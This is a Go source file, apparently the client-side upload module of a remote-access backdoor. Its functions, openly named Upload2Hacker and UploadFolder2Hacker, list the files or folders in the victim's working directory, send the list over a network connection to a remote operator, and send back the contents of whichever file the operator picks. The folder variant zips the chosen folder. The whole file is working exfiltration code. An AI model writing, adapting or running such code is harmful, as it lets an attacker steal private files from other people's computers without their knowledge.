package upload

import (
	"archive/zip"
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func ReadFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("[+] Unable to open file")
		return nil, err
	}

	defer file.Close()

	stats, err := file.Stat()
	FileSize := stats.Size()
	fmt.Println("[+] the File Contains ", FileSize, " bytes")

	bytes := make([]byte, FileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)

	return bytes, err
}

func AddFilesToZip(ZipWriter *zip.Writer, basePath string, baseInZip string) {

	files, err := os.ReadDir(basePath)
	if err != nil {
		fmt.Println(err)
	}
	for _, file := range files {
		fmt.Println("[+] ", basePath+file.Name())

		if !file.IsDir() {
			data, err := os.ReadFile(basePath + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			f, err := ZipWriter.Create(baseInZip + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			_, err = f.Write(data)
		} else if file.IsDir() {
			newBase := basePath + file.Name() + "/"
			fmt.Println("Adding Subdir: ", file.Name())
			fmt.Println("Adding Subdir: ", newBase)

			AddFilesToZip(ZipWriter, newBase, baseInZip+file.Name()+"/")
		}
	}
}

func ZipWriter(baseFolder, outputFileName string) {

	OutFile, err := os.Create(outputFileName)
	if err != nil {
		fmt.Println(err)
	}

	defer OutFile.Close()
	ZipWriter := zip.NewWriter(OutFile)

	AddFilesToZip(ZipWriter, baseFolder, "")

	err = ZipWriter.Close()
	if err != nil {
		fmt.Println(err)
	}
}

func Upload2Hacker(connection net.Conn) (err error) {

	var files []string
	filesArr, _ := os.ReadDir(".")
	for index, file := range filesArr {
		mode := file.Type()
		if mode.IsRegular() {
			files = append(files, file.Name())
			fmt.Println("\t", index, "\t", file.Name())
		}
	}

	files_list := &FilesList{Files: files}

	enc := gob.NewEncoder(connection)
	err = enc.Encode(files_list)

	reader := bufio.NewReader(connection)
	fileName2download_raw, err := reader.ReadString('\n')

	fileName2download := strings.TrimSuffix(fileName2download_raw, "\n")

	contents, err := ReadFileContents(fileName2download)

	fs := &Data{
		FileName:    fileName2download,
		FileSize:    len(contents),
		FileContent: contents,
	}

	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(fs)

	return
}

func UploadFolder2Hacker(connection net.Conn) (err error) {
	rootDir := "."

	var folders []string

	elements, _ := os.ReadDir(rootDir)
	for index, file := range elements {
		if file.IsDir() {
			fmt.Println(index, " ", file.Name())
			folders = append(folders, file.Name())
		}
	}

	files_list := &FilesList{Files: folders}

	enc := gob.NewEncoder(connection)
	err = enc.Encode(files_list)

	reader := bufio.NewReader(connection)
	folderName2download_raw, err := reader.ReadString('\n')

	folderName2download := strings.TrimSuffix(folderName2download_raw, "\n")
	ZipWriter(folderName2download+"/", folderName2download+".zip")

	return
}
